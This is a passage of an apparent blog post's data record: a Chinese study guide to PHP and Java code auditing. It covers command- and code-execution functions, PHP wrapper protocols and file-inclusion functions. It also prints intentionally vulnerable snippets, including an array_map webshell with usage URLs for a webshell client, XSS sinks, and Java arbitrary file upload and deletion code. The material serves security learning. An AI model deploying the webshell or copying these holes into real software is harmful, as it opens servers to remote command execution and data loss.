document.write(name);\neval(\"var a = \" + name);\n</script>\n储存型xss 会通过JDBC与数据库交互\n```\n\n\n\n### 6.Java 常用的文件操作方法\n\n```\nFiles.readAllBytes、Files.readAllLines\nFileInputStream\nFileOutputStream\nFile\nFileUtils\nIOUtils\nBufferedReader\nServletFileUpload\nMultipartFile\nCommonsMultipartFile\nPrintWriter\nZipInputStream\nZipEntry.getSize\n```\n\n\n\n### 7.文件上传关键函数\n\n```\nDiskFileItemFactory@MultipartConfigMultipartFileFile\nUpload\nInputStream\nOutputStream\nwrite\nfileName\nfilePath\n```\n\n\n\n### 8.servlet文件上传函数\n\n> servlet3之前\n> 使用commons-fileupload、commons-io这两个jar包来处理文件上传\n>\n> servlet3之后\n> 使用request.getParts()获取上传文件\n\n\n\n### 9.java任意文件上传\n\n```\nprivate boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n    Part part = request.getPart(\"fileName\");\n    if(part == null) {\n      return false;\n    }\n    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();\n    part.write(filename);\n    part.delete();\n    return true;\n}\n```\n\n\n\n### 10.任意文件删除\n\n```\nString filename = request.getParameter(\"filename\");\nFile file = new File(filename);\nif(file != null && file.exists() && file.delete()) {\n  \tresponse.getWriter().println(\"delete success\");\n} else {\n  \tresponse.getWriter().println(\"delete failed\");\n}\n```","slug":"PHP  JAVA复习指南","published":1,"updated":"2024-04-17T08:43:00.187Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ij0008h77632qx5n8c","content":"<h1 id=\"PHP-JAVA复习指南\"><a href=\"#PHP-JAVA复习指南\" class=\"headerlink\" title=\"PHP &#x2F; JAVA复习指南\"></a>PHP &#x2F; JAVA复习指南</h1><h2 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h2><h3 id=\"1-php-命令执行函数以及函数应用场景\"><a href=\"#1-php-命令执行函数以及函数应用场景\" class=\"headerlink\" title=\"1.php 命令执行函数以及函数应用场景\"></a>1.php 命令执行函数以及函数应用场景</h3><ul>\n<li><code>system()</code> 将字符串作为OS命令执行，自带输出功能。</li>\n<li><code>passthru()</code>将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。</li>\n<li><code>exec()</code>将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。</li>\n<li><code>shell_exec</code> 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容</li>\n<li><code>popen()/proc_open()</code>该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。需要用**<u>fread</u>**来读</li>\n<li><code>反引号 </code> [&#96;&#96;]反引号里面的代码也会被当作OS命令来执行</li>\n</ul>\n<h3 id=\"2-php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php-ini中进行怎样的配置？\"><a href=\"#2-php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php-ini中进行怎样的配置？\" class=\"headerlink\" title=\"2.php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php.ini中进行怎样的配置？\"></a>2.php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php.ini中进行怎样的配置？</h3><p>php封装协议又称为伪协议，主要分为以下几种：</p>\n<ul>\n<li><p><code>file://</code>  file:&#x2F;&#x2F; 用于访问本地文件系统它在双off的情况下也可以正常使用；allow_url_fopen ：off&#x2F;on allow_url_include：off&#x2F;on</p>\n</li>\n<li><p><code>php://filter</code> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了在双off的情况下也可以正常使用；</p>\n</li>\n<li><p><code>php://input</code> 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据allow_url_fopen ：off&#x2F;on</p>\n<p>allow_url_include：on</p>\n</li>\n<li><p><code>zip:// compress.bzip:// compress.zlib://</code>均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。双off也能用</p>\n</li>\n<li><p><code>data://</code> 数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。必须要双on才可以</p>\n</li>\n<li><p><code>phar:/</code>&#x2F; 反序列化有时会用到 与zip协议不同的是zip协议为绝对路径，而phar协议为相对路径</p>\n</li>\n</ul>\n<h3 id=\"3-代码执行函数\"><a href=\"#3-代码执行函数\" class=\"headerlink\" title=\"3.代码执行函数\"></a>3.代码执行函数</h3><ul>\n<li><p><code>preg_replace()</code> 在php 5.6及之前的版本，当第一个参数在 &#x2F;e 的修饰下，并且 magic_quotes_gpc&#x3D;Off 时，函数的第二个参数会被当做php代码执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&#x27; . $_GET[&#x27;reg&#x27;], &#x27;\\\\1&#x27; ,&#x27;&lt;php&gt;phpinfo()&lt;php&gt;&#x27;);</span><br><span class=\"line\">\tpreg_replace(&#x27;/anything/e&#x27;, $_GET[&#x27;test&#x27;], &#x27;anything_test&#x27;);</span><br><span class=\"line\">\tpreg_replace(&#x27;/&lt;php&gt;(.*?)&lt;\\/php&gt;/e&#x27;, &#x27;\\\\1&#x27;, $_GET[&#x27;test&#x27;]);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>array_map()</code> 第一个参数是回调函数，第二参数是函数的参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $func=$_GET[&#x27;func&#x27;];</span><br><span class=\"line\">    $cmd=$_POST[&#x27;cmd&#x27;];</span><br><span class=\"line\">    $array[0]=$cmd;</span><br><span class=\"line\">    $new_array=array_map($func,$array);</span><br><span class=\"line\">    echo $new_array;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">//    命令执行http://localhost/123.php?func=system   cmd=whoami</span><br><span class=\"line\"> //   菜刀连接http://localhost/123.php?func=assert   密码：cmd</span><br></pre></td></tr></table></figure>\n\n\n</li>\n<li><p><code>assert()</code> 判断一个表达式是否成立，能够把字符组成的字符串，当作代码执行。</p>\n<blockquote>\n<p>assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾（特别注意），有时加上分号不会显示结</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"4-php-中常见的文件读取-写入函数\"><a href=\"#4-php-中常见的文件读取-写入函数\" class=\"headerlink\" title=\"4.php 中常见的文件读取&#x2F;写入函数\"></a>4.php 中常见的文件读取&#x2F;写入函数</h3><p>共有9个文件读取函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents   // *</span><br><span class=\"line\">fread</span><br><span class=\"line\">fgets</span><br><span class=\"line\">fgetss</span><br><span class=\"line\">file</span><br><span class=\"line\">parse_ini_file</span><br><span class=\"line\">readfile    // *</span><br><span class=\"line\">highlight_file  // *</span><br><span class=\"line\">show_source // *</span><br></pre></td></tr></table></figure>\n\n<p>使用方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// file_get_contents</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;file_get_contents&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fread</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fread&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$file</span>,<span class=\"number\">1024</span>);     <span class=\"comment\">// 参数为 resource 类型</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fgets</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fgets&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);      </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fgets</span>(<span class=\"variable\">$file</span>, <span class=\"number\">4096</span>);        <span class=\"comment\">// 过滤掉了 HTML 和 PHP 标签</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// fopen fgetss</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;fopen fgetss&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);     </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fgetss</span>(<span class=\"variable\">$file</span>, <span class=\"number\">4096</span>);        <span class=\"comment\">// 过滤掉了 HTML 和 PHP 标签</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// readfile</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;readfile&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">readfile</span>(<span class=\"string\">&quot;flag.txt&quot;</span>);      <span class=\"comment\">// 看到不仅输出了所有内容，而且还输出了总共长度</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">file</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>));      <span class=\"comment\">// 读取结果为数组，所以需要用 print_r 或 var_dump </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// parse_ini_file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;parse_ini_file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">parse_ini_file</span>(<span class=\"string\">&quot;flag.txt&quot;</span>);        <span class=\"comment\">// 只能读取 ini 配置文件</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// show_source</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;show_source&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// highlight_file</span></span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&quot;%&#x27;-10s%-&#x27;-30s&quot;</span>, <span class=\"string\">&#x27;-&#x27;</span>, <span class=\"string\">&#x27;highlight_file&#x27;</span>).PHP_EOL);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;flag.txt&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在PHP中使用 fweite() 和file_put_contents()函数向文件中写入数据。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$file</span>,<span class=\"string\">&quot;Hello World. Testing!&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;test.txt&quot;</span>,<span class=\"string\">&quot;Hello World. Testing!&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"5-php-文件包含方法以及区别\"><a href=\"#5-php-文件包含方法以及区别\" class=\"headerlink\" title=\"5.php 文件包含方法以及区别\"></a>5.php 文件包含方法以及区别</h3><ul>\n<li><p><code>include</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php include &#x27;test.php&#x27;;?&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>include_once</code>  可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题</p>\n</li>\n<li><p><code>require</code> 与include方法基本一样</p>\n</li>\n<li><p><code>require_once</code>   require_once 语句时会先检查要包含的文件是不是已经在该程序中的其他地方被包含过，如果有，则不会再次重复包含该文件</p>\n</li>\n</ul>\n<p>区别</p>\n<blockquote>\n<p>1、include如果碰到错误，会给出提示，并继续向下执行；而require会终止程序执行。2、require_once和include_once中如果包含的文件已经被包含过，就不会再次包含，但include和require会。</p>\n</blockquote>\n<h3 id=\"6-php反序列化漏洞涉及函数\"><a href=\"#6-php反序列化漏洞涉及函数\" class=\"headerlink\" title=\"6.php反序列化漏洞涉及函数\"></a>6.php反序列化漏洞涉及函数</h3><ul>\n<li><p><code>serialize()</code>  序列化：把对象转化为二进制的字符串</p>\n</li>\n<li><p><code>unserialize()</code> 反序列化：把对象转化的二进制字符串再转化为对象</p>\n</li>\n<li><p>魔术方法 可能在某些情况下自动调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.__construct()，类的构造函数</span><br><span class=\"line\"></span><br><span class=\"line\">2.__destruct()，类的析构函数</span><br><span class=\"line\"></span><br><span class=\"line\">3.__call()，在对象中调用一个不可访问方法时调用</span><br><span class=\"line\"></span><br><span class=\"line\">4.__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class=\"line\"></span><br><span class=\"line\">5.__get()，获得一个类的成员变量时调用</span><br><span class=\"line\"></span><br><span class=\"line\">6.__set()，设置一个类的成员变量时调用</span><br><span class=\"line\"></span><br><span class=\"line\">7.__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class=\"line\"></span><br><span class=\"line\">8.__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class=\"line\"></span><br><span class=\"line\">9.__sleep()，执行serialize()时，先会调用这个函数</span><br><span class=\"line\"></span><br><span class=\"line\">10.__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class=\"line\"></span><br><span class=\"line\">11.__toString()，类被当成字符串时的回应方法</span><br><span class=\"line\"></span><br><span class=\"line\">12.__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class=\"line\"></span><br><span class=\"line\">13.__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class=\"line\"></span><br><span class=\"line\">14.__clone()，当对象复制完成时调用</span><br><span class=\"line\"></span><br><span class=\"line\">15.__autoload()，尝试加载未定义的类</span><br><span class=\"line\"></span><br><span class=\"line\">16.__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"7-php-常见数组及引用\"><a href=\"#7-php-常见数组及引用\" class=\"headerlink\" title=\"7.php 常见数组及引用\"></a>7.php 常见数组及引用</h3><ul>\n<li><p><code>$_GET</code> 预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。</p>\n<p>从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制</p>\n</li>\n<li><p><code>$POST</code>预定义的 $_POST 变量用于收集来自 method&#x3D;”post” 的表单中的值。</p>\n<p>从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。</p>\n</li>\n<li><p><code>$_REQUEST</code> 既可以接收$_GET又可以接收$POST的值</p>\n</li>\n<li><p><code>$_FILES</code> 上传文件信息</p>\n</li>\n<li><p><code>$_COOKIE</code>用于获取 cookie 的值。</p>\n</li>\n<li><p><code>$SESSION</code>读取Session变量信息</p>\n</li>\n</ul>\n<h2 id=\"JAVA\"><a href=\"#JAVA\" class=\"headerlink\" title=\"JAVA\"></a>JAVA</h2><h3 id=\"1-Web服务器\"><a href=\"#1-Web服务器\" class=\"headerlink\" title=\"1.Web服务器\"></a>1.Web服务器</h3><p>常见的java EE web服务器</p>\n<p><strong>tomcat   jetty  resin</strong></p>\n<p>专业级java EE web 服务器</p>\n<p><strong>JBOSS   GlassFish   Weblogic   Webshpere</strong></p>\n<p>常见漏洞</p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/399939177\" >https://zhuanlan.zhihu.com/p/399939177<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"2-tomcat目录结构与功能\"><a href=\"#2-tomcat目录结构与功能\" class=\"headerlink\" title=\"2.tomcat目录结构与功能\"></a>2.tomcat目录结构与功能</h3><ul>\n<li><code>bin</code>:目录里主要是有启动和关闭应用服务器的bat批处理命令；</li>\n<li><code>conf</code>:这个目录里主要是支持配置Tomcat的文件。</li>\n<li><code>lib</code>:这里面是支持Tomcat启动的jar包，当然也可以放你自己项目需要的jar包。</li>\n<li><code>temp</code>:Tomcat运行过程中产生的临时文件。</li>\n<li><code>webapps</code>:这里就是你的项目了，你的项目可以是以文件或者jar包的方式存放在这个目录里。</li>\n<li><code>work</code>：work目录用来存放tomcat在运行时的编译后文件，例如JSP编译后的文件。</li>\n</ul>\n<h3 id=\"3-tomcat中web-xml-与-tomcat-user-xml-的作用\"><a href=\"#3-tomcat中web-xml-与-tomcat-user-xml-的作用\" class=\"headerlink\" title=\"3.tomcat中web.xml 与 tomcat_user.xml 的作用\"></a>3.tomcat中web.xml 与 tomcat_user.xml 的作用</h3><p><code>web.xml</code><br>Tomcat可以让用户通过将缺省的web.xml放入conf目录中来定义所有关系环境的web.xml的缺省值.建立一个新的关系环境时,Tomcat使用缺省的web.xml文件作为基本设置和应用项目特定的web.xml(放在应用项目的WEB-INF&#x2F;web.xml文件)来覆盖这些缺省值.是配置整个tomcat的jsp和servlet工作中的一些情况,比如我们配置list来不让我们输入一个目录的时候显示出那个目录下的jsp文件,而是显示404错误.还有在一些安全方面也可以做配置.</p>\n<p><code>tomcat-users.xml</code><br> 配置tomcat的用户了信息.可以到tomcat的开始页<a href=\"http://localhost:8080中点tomcat\">http://localhost:8080中点tomcat</a> manager就会提示你要用户名和密码了,这里的用户名和密码就可以在这个xml中配置的</p>\n<h3 id=\"4-什么是jsp\"><a href=\"#4-什么是jsp\" class=\"headerlink\" title=\"4.什么是jsp\"></a>4.什么是jsp</h3><blockquote>\n<p>JSP全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以&lt;%开头以%&gt;结束。</p>\n<p>JSP是一种Java servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p>\n<p>JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p>\n<p>JSP标签有多种功能，比如访问数据库、记录用户选择信息、访问JavaBeans组件等，还可以在不同的网页中传递控制信息和共享信息。</p>\n</blockquote>\n<h3 id=\"5-java-代码审计xss\"><a href=\"#5-java-代码审计xss\" class=\"headerlink\" title=\"5.java 代码审计xss\"></a>5.java 代码审计xss</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前端反射型xss   (name参数可控) </span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">String name = request.getParameter(&quot;name&quot;);</span><br><span class=\"line\">out.println(name)</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">后端反射型 xss  (msg参数可控) </span><br><span class=\"line\">public void Message(HttpServletRequest req, HttpServletResponse resp) &#123;</span><br><span class=\"line\">\tString message = req.getParameter(&quot;msg&quot;);</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">\tresp.getWriter().print(message);</span><br><span class=\"line\">&#125; catch (IOException e) &#123;</span><br><span class=\"line\">\te. printStackTrace();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">DOM xss只发生在客户端处理数据阶段，未经过滤被传入存在缺陷的JavaScript代码处理。</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var pos = document.URL.indexOf(&quot;#&quot;)+1;</span><br><span class=\"line\">    var name = document.URL.substring(pos, document.URL.length);</span><br><span class=\"line\">    document.write(name);</span><br><span class=\"line\">eval(&quot;var a = &quot; + name);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">储存型xss 会通过JDBC与数据库交互</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"6-Java-常用的文件操作方法\"><a href=\"#6-Java-常用的文件操作方法\" class=\"headerlink\" title=\"6.Java 常用的文件操作方法\"></a>6.Java 常用的文件操作方法</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Files.readAllBytes、Files.readAllLines</span><br><span class=\"line\">FileInputStream</span><br><span class=\"line\">FileOutputStream</span><br><span class=\"line\">File</span><br><span class=\"line\">FileUtils</span><br><span class=\"line\">IOUtils</span><br><span class=\"line\">BufferedReader</span><br><span class=\"line\">ServletFileUpload</span><br><span class=\"line\">MultipartFile</span><br><span class=\"line\">CommonsMultipartFile</span><br><span class=\"line\">PrintWriter</span><br><span class=\"line\">ZipInputStream</span><br><span class=\"line\">ZipEntry.getSize</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"7-文件上传关键函数\"><a href=\"#7-文件上传关键函数\" class=\"headerlink\" title=\"7.文件上传关键函数\"></a>7.文件上传关键函数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 